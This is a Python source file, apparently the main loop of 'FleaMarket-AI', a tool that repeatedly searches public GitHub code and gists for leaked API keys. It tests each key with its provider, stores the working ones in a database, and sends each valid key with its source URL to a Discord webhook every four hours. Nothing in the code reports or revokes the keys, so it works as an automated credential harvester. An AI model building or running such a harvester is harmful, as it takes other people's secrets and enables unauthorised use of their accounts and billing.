"""Main orchestrator for FleaMarket-AI.

1. Initialise DB.
2. Discover candidate keys (public GitHub search, gists, etc.).
3. Validate each key via provider-specific logic.
4. Persist results.
5. Send Discord webhook on successful finds.
6. Sleep 4 hours and repeat forever.
"""

import logging
import logging.handlers
import os
import time
import traceback
from pathlib import Path

from . import db, discover, validate, notify

# ── Logging setup ──────────────────────────────────────────────────────────────
LOG_DIR = Path(__file__).resolve().parents[1] / "logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE = LOG_DIR / "fleamarket.log"

_fmt = logging.Formatter(
    fmt="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

_file_handler = logging.handlers.RotatingFileHandler(
    LOG_FILE,
    maxBytes=5 * 1024 * 1024,   # 5 MB per file
    backupCount=5,               # keep fleamarket.log + 5 rotations
    encoding="utf-8",
)
_file_handler.setFormatter(_fmt)

_console_handler = logging.StreamHandler()
_console_handler.setFormatter(_fmt)

log = logging.getLogger("fleamarket")
log.setLevel(logging.INFO)
log.addHandler(_file_handler)
log.addHandler(_console_handler)

# Sleep interval – override via SCAN_INTERVAL_SECONDS env var (seconds)
SLEEP_SECONDS = int(os.getenv("SCAN_INTERVAL_SECONDS", str(4 * 3600)))


def run_once():
    db.init_db()

    github_token = os.getenv("GITHUB_TOKEN")
    if not github_token:
        log.warning("GITHUB_TOKEN not set – running unauthenticated (60 req/hr limit)")

    discoveries = discover.discover_keys(github_token=github_token)

    if not discoveries:
        log.info("No new keys discovered this cycle.")
        return

    log.info("Discovered %d candidate key(s) this cycle.", len(discoveries))

    for entry in discoveries:
        # Support both 3-tuple (legacy) and 4-tuple (current) discovery formats
        if len(entry) == 4:
            provider, api_key, source_url, line_num = entry
        else:
            provider, api_key, source_url = entry
            line_num = None

        # Skip if we already have a confirmed-valid record for this exact key
        existing = db.get_all_keys()
        already_valid = any(
            e["provider"] == provider and e["api_key"] == api_key and e.get("is_valid")
            for e in existing
        )
        if already_valid:
            log.info("Skip duplicate valid %s key from %s", provider.upper(), source_url)
            continue

        try:
            is_valid, msg = validate.validate_provider(provider, api_key)
            db.upsert_key(provider, api_key, source_url, is_valid, msg)
            status = "VALID  ✓" if is_valid else "INVALID"
            log.info("%s | %s | %s | %s", provider.upper().ljust(16), status, source_url, msg)

            if is_valid:
                ok, note = notify.send_notification(provider, api_key, source_url, msg, line_num)
                if ok:
                    log.info("Discord webhook sent for %s key.", provider)
                else:
                    log.warning("Discord webhook failed: %s", note)
        except Exception as e:
            log.error("Error processing %s key from %s: %s", provider, source_url, e)
            log.debug(traceback.format_exc())


def main():
    log.info("=== FleaMarket-AI started (interval=%.1fh) ===", SLEEP_SECONDS / 3600)
    while True:
        try:
            run_once()
        except Exception as e:
            log.error("Unexpected error in cycle: %s", e)
            log.debug(traceback.format_exc())
        log.info("Sleeping for %.1fh ...", SLEEP_SECONDS / 3600)
        time.sleep(SLEEP_SECONDS)


if __name__ == "__main__":
    main()
